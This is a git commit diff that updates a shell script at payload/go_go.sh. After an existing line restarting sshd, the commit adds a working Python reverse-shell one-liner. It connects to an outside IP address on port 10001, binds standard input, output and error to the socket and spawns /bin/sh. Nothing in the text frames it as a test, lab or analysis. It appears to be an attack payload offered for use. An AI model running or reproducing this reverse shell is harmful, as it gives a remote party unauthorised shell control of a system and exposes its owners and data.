24233a6e8275d3575fa2e07e58203c4841f4db9b
ta3nich <118207850+ta3nich@users.noreply.github.com>
2023-02-03 15:29:11 +0100

    Update go_go.sh

--- payload/go_go.sh
+++ payload/go_go.sh
@@ -1,1 +1,3 @@
 service sshd restart
+python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("105.105.242.3",10001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+
